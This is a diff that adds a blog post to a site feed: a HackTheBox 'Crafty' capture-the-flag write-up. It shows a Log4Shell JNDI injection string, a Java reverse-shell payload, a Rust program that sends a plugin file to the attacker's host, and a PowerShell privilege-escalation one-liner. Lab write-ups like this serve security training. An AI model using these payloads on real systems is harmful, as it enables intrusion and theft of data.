@@ -7,13 +7,191 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language><atom:link href="/writeups/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>W.I.P</title>
-      <link>/writeups/test/</link>
+      <title>HackTheBox -- Crafty -- WriteUp</title>
+      <link>/writeups/crafty/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/writeups/test/</guid>
-      <description>Work in Progress</description>
-      <content>&lt;p&gt;Work in Progress&lt;/p&gt;
+      <guid>/writeups/crafty/</guid>
+      <description>1 Reconnaissance To start the pentest off, we firstly start with some active recon. We start a nmap using the following parameters: nmap -T4 -sV -Pn -p- 10.10.11.249 The results are.. interesting, we firstly see a webserver and a Minecraft server. When seeing the Minecraft server I instantly thought of log4j since this was a huge deal back in the good &amp;lsquo;ol times, nearly everything that used java was vulnerable. Fun times.</description>
+      <content>&lt;h1 id=&#34;1-reconnaissance&#34;&gt;&lt;code&gt;1&lt;/code&gt; Reconnaissance&lt;/h1&gt;
+&lt;p&gt;To start the pentest off, we firstly start with some active recon. We start a nmap using the following parameters: &lt;code&gt;nmap -T4 -sV -Pn -p- 10.10.11.249&lt;/code&gt;
+
+&lt;img src=&#34;/img/nmap_crafty.png&#34;  alt=&#34;Nmap Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;The results are.. interesting, we firstly see a webserver and a &lt;code&gt;Minecraft&lt;/code&gt; server. When seeing the Minecraft server I instantly thought of &lt;code&gt;log4j&lt;/code&gt; since this was a huge deal back in the good &amp;lsquo;ol times, nearly everything that used java was vulnerable. Fun times.&lt;/p&gt;
+&lt;p&gt;I decided to blindsight the webserver for a bit and focus on the, very outdated, Minecraft server.&lt;/p&gt;
+&lt;h1 id=&#34;2-weaponization&#34;&gt;&lt;code&gt;2&lt;/code&gt; Weaponization&lt;/h1&gt;
+&lt;p&gt;Since writing a log4j exploit by myself seemed silly, as the exploit is already three years old, I decided to browse the internet a bit. I came across this repo &lt;code&gt;https://github.com/kozmer/log4j-shell-poc&lt;/code&gt;. Which fit my needs nearly perfectly.&lt;/p&gt;
+&lt;p&gt;The code needed a little bit of a change as the &lt;code&gt;cmd&lt;/code&gt; string to spawn an executor for us was set to &lt;code&gt;/bin/sh&lt;/code&gt; which wouldn&amp;rsquo;t have worked as Crafty is a Windows box. It&amp;rsquo;s a Windows box which can be concluded from the OS guess of nmap but an even bigger indicator is Microsoft IIS httpd which is used as a webserver.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;log4j exploit&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+	def generate_payload(userip: str, lport: int) -&amp;gt; None:
+	    program = &amp;#34;&amp;#34;&amp;#34;
+		import java.io.IOException;
+		import java.io.InputStream;
+		import java.io.OutputStream;
+		import java.net.Socket;
+
+		public class Exploit {
+
+		    public Exploit() throws Exception {
+			String host=&amp;#34;%s&amp;#34;;
+			int port=%d;
+			String cmd=&amp;#34;cmd.exe&amp;#34;;
+			Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+			Socket s=new Socket(host,port);
+			InputStream pi=p.getInputStream(),
+			    pe=p.getErrorStream(),
+			    si=s.getInputStream();
+			OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+			while(!s.isClosed()) {
+			    while(pi.available()&amp;gt;0)
+				so.write(pi.read());
+			    while(pe.available()&amp;gt;0)
+				so.write(pe.read());
+			    while(si.available()&amp;gt;0)
+				po.write(si.read());
+			    so.flush();
+			    po.flush();
+			    Thread.sleep(50);
+			    try {
+				p.exitValue();
+				break;
+			    }
+			    catch (Exception e){
+			    }
+			};
+			p.destroy();
+			s.close();
+		    }
+		}
+		&amp;#34;&amp;#34;&amp;#34; % (userip, lport)
+
+		    # writing the exploit to Exploit.java file
+
+		    p = Path(&amp;#34;Exploit.java&amp;#34;)
+
+		    try:
+			p.write_text(program)
+			subprocess.run([os.path.join(CUR_FOLDER, &amp;#34;jdk1.8.0_20/bin/javac&amp;#34;), str(p)])
+		    except OSError as e:
+			print(Fore.RED &amp;#43; f&amp;#39;[-] Something went wrong {e}&amp;#39;)
+			raise e
+		    else:
+			print(Fore.GREEN &amp;#43; &amp;#39;[&amp;#43;] Exploit java class created success&amp;#39;)
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;h1 id=&#34;3-delivery--exploitation--installation--command-and-control&#34;&gt;&lt;code&gt;3&lt;/code&gt; Delivery &amp;amp; Exploitation &amp;amp; Installation &amp;amp; Command and Control&lt;/h1&gt;
+&lt;p&gt;To deliver and exploit the log4j exploit we need three things. Firstly we need to install our own Minecraft client and join the server, then we need to run the Proof-of-Concept of the log4j exploit since this is where the server will reach out to and lastly we need to start a seperate listener so the server can connect back to us.&lt;/p&gt;
+
+&lt;img src=&#34;/img/b4exploit.png&#34;  alt=&#34;Log4j prepare Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;After joining the server, we need to paste the &lt;code&gt;${jndi:ldap://10.10.16.85:1389/a}&lt;/code&gt; into the server chat. Once we press enter, we will receive a connection from the server back.&lt;/p&gt;
+
+&lt;img src=&#34;/img/duringlog4j.png&#34;  alt=&#34;Log4j Exploit Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;h1 id=&#34;4-actions-on-objective&#34;&gt;&lt;code&gt;4&lt;/code&gt; Actions on Objective&lt;/h1&gt;
+&lt;p&gt;We now have access to the user of the box. When we move to &lt;code&gt;C:\Users\svc_minecraft\Desktop&lt;/code&gt; we can get the user flag. Ofcourse I cannot show the full flag as that would ruin the fun :)&lt;/p&gt;
+
+&lt;img src=&#34;/img/crafty_userflag.png&#34;  alt=&#34;userflag Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;h1 id=&#34;41-privilege-escalation&#34;&gt;&lt;code&gt;4.1&lt;/code&gt; Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;User access is great, but we can go a step further essentially &lt;code&gt;rooting&lt;/code&gt; the box. To kickoff privilege escalation I first decided to check the access this account had by checking it&amp;rsquo;s current privileges and group membership.&lt;/p&gt;
+
+&lt;img src=&#34;/img/crafty_whoamiall.png&#34;  alt=&#34;userflag Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;Ofcourse I also had to check what useraccounts are currently in the administrator localgroup&lt;/p&gt;
+
+&lt;img src=&#34;/img/netlocalgroupadministrator_crafty.png&#34;  alt=&#34;local admin Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;Welp, nothing too obvious I could exploit, the next step was to run &lt;code&gt;winPEAS.exe&lt;/code&gt; and see if that would give anything note worthy.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;winPEAS.exe&lt;/code&gt; gave nothing note worthy back, no unqouted service paths that I could edit and no lingering password files. In a small conclusion nothing really stood out to me. I decided to enumerate further with focus on the minecraft server, and doing so ended up in the plugins folder.&lt;/p&gt;
+
+&lt;img src=&#34;/img/pluginscrafty.png&#34;  alt=&#34;plugins Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;Odly enough there was only one plugin &lt;code&gt;playercounter-1.0-SNAPSHOT.jar&lt;/code&gt; which grabbed my attention. Next I need to figure out how to exfiltrate this plugin to decompile it.&lt;/p&gt;
+&lt;p&gt;After failing horribly thrice to just POST the file to my attackbox using all kinds of weird Powershell MumboJumbo, I decided to just do what I know. I wrote a very ~shitty~ Rust executable to just exfiltrate the file for me.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;Rust&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Plugin exfiltrate&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-Rust&#34; &gt;&lt;code&gt;
+	use std::net::TcpStream;
+	use std::io::Read;
+	use std::io::Write;
+
+	fn main() {
+	    println!(&amp;#34;Hello, world!&amp;#34;);
+
+	    if let Ok(mut stream) = TcpStream::connect(&amp;#34;10.10.16.85:1337&amp;#34;) {
+			if let Ok(mut file) = std::fs::File::open(&amp;#34;C:\\Users\\svc_minecraft\\server\\plugins\\playercounter-1.0-SNAPSHOT.jar&amp;#34;) {
+		    	let mut buffer: Vec&amp;lt;u8&amp;gt; = Vec::new();
+
+		    	if let Ok(_) = file.read_to_end(&amp;amp;mut buffer) {
+					stream.write_all(&amp;amp;buffer);
+			   }
+	    	}
+	     }
+	}
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;I started up netcat with port &lt;code&gt;1337&lt;/code&gt; uploaded this executable to Crafty and ran it.&lt;/p&gt;
+
+&lt;img src=&#34;/img/customexfil.png&#34;  alt=&#34;Exfil Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;Now it was time to decompile the java file, for this I used &lt;code&gt;jd-gui&lt;/code&gt; which decompiled java and shows it in a nice GUI. What was found in the PlayerCounter class was an encoded base64 string that looked like a password. When I found this I was over the moon, as winpeas didn&amp;rsquo;t result in an actionable Priv Esc vector.&lt;/p&gt;
+
+&lt;img src=&#34;/img/jd-gui.png&#34;  alt=&#34;JdGui Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;When I tried decoding this Base64 string I got garbage, so I knew from this point it was encrypted. Luckily Powershell can deal with these kinds of passwords.
+Firstly I made a simple Powershell reverse shell that was linked to nc port &lt;code&gt;4446&lt;/code&gt;. I then uploaded this &lt;code&gt;.ps1&lt;/code&gt; script file to the target.&lt;/p&gt;
+
+&lt;img src=&#34;/img/simplePSshell_crafty.png&#34;  alt=&#34;Powershell Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;Combining the password found in the plugin, I made a powershell oneliner that creates the credentials using Administrator as it&amp;rsquo;s username and the recovered base64 encoded string as the password. Next I passed the &lt;code&gt;backup.ps1&lt;/code&gt; as an argument.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @(&amp;quot;Administrator&amp;quot;, ConvertTo-SecureString -String &amp;quot;s67u84zKq8IXw&amp;quot; -AsPlainText -Force)); Start-Process powershell.exe -Credential $credentials -ArgumentList &amp;quot;-file C:\users\svc_minecraft\Desktop\backup.ps1&amp;quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;img src=&#34;/img/crafty_admin.png&#34;  alt=&#34;Admin Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;Last thing to do is move to &lt;code&gt;C:\Users\Administrator\Desktop&lt;/code&gt; and get the root.txt&lt;/p&gt;
+
+&lt;img src=&#34;/img/crafty_rootflag.png&#34;  alt=&#34;Root Crafty&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;h1 id=&#34;5-conclusion&#34;&gt;&lt;code&gt;5&lt;/code&gt; Conclusion&lt;/h1&gt;
+&lt;p&gt;The Crafty box was a fun time, allthough marked as an easy box I experienced the rooting of it not as such. Getting a foothold into the box was a piece of cake and took me roughly five minutes, mostly because I focussed fully on the outdated Minecraft server as my way in.&lt;/p&gt;
+&lt;p&gt;The escalation of privileges wasn&amp;rsquo;t as straight forward as I would&amp;rsquo;ve expected, and somehow I doubt its real-world application. Nonetheless it was a fun box and have learned to &lt;code&gt;try harder&lt;/code&gt;.&lt;/p&gt;
 </content>
     </item>
     
